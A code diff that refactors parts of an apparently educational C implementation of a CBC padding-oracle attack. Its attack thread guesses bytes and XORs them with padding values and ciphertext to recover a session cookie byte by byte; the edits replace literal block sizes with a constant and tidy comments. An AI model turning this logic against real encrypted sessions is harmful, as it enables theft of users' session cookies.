@@ -89,19 +89,9 @@ int main(int argc, char *argv[]) {
     op_mode = argv[1][1];
   }
 
-  // -l --> LocalHost
-  // -n --> client and server in the same NETWORK
-  // -i --> client in the same LAN and server outside
   if(argv[2][0] == '-'){
     network_config = argv[2][1];
   }
-
-  /*
-  data_packet = (Data_packet *)calloc(1, sizeof(Data_packet));
-  if(!data_packet){
-    perror("Error allocating memory for data_packet! \n");
-    exit(EXIT_FAILURE);
-  } */
 
   data_packet = init_data_packet();
   
@@ -144,7 +134,7 @@ int main(int argc, char *argv[]) {
       strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
       break;
     default:
-      fprintf(stderr, "Invalid netowkr configuration flag! \n");
+      fprintf(stderr, "Invalid network configuration flag! \n");
   }
 
   printf("Mio indirizzo ip: %s \n indirizzo ip default gateway: %s \n", my_ip, gateway_ip);
@@ -604,7 +594,6 @@ void *do_attack_thread(void *arg){
   //printf("server interface: %s", server_interface);
 
   while(1){
-    // In do_attack_thread:
     pthread_mutex_lock(&attack_thread_mutex);
     while(attack == false){
       pthread_cond_wait(&attack_thread_cond, &attack_thread_mutex);
@@ -664,10 +653,10 @@ void *do_attack_thread(void *arg){
         Byte guessed_last = (byte_guess & 0xFF);
         printf("penultimate byte: 0x%02x last byte: 0x%02x\n", guessed_penultimate, guessed_last);
 
-        int block_pos = (data_packet->data_len - 5 - 16)/16;
+        int block_pos = (data_packet->data_len - 5 - BLOCK_DIM)/BLOCK_DIM;
         block_pos -= 1;
 
-        int block_offset = 5 + (block_pos * 16); 
+        int block_offset = 5 + (block_pos * BLOCK_DIM); 
         
         //original packet è sostanzialmente un clone del pacchetto data_packet prima della modifica, quindi contiene i byte originali del pacchetto
         Byte *original_packet_data = original_packet->data;
@@ -714,7 +703,8 @@ void *do_attack_thread(void *arg){
         int guessed_byte = analyze_single_byte(a_result);
         printf("guessed byte: 0x%02x \n", guessed_byte);
 
-        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + ((4-1) * 16 ) + 14];
+        int block_pos = (original_packet->data_len - 5 - BLOCK_DIM) / BLOCK_DIM;
+        int plain_byte = expected_padding ^ guessed_byte ^ original_packet->data[5 + (block_pos * BLOCK_DIM ) + 14];
         printf("Plaintext byte: 0x%02x (ASCII: %c)\n", plain_byte, plain_byte);
         //aggiungere il byte in chiaro al cookie e tenerne traccia per la modifica successiva
         cookie[cookie_index] = plain_byte;
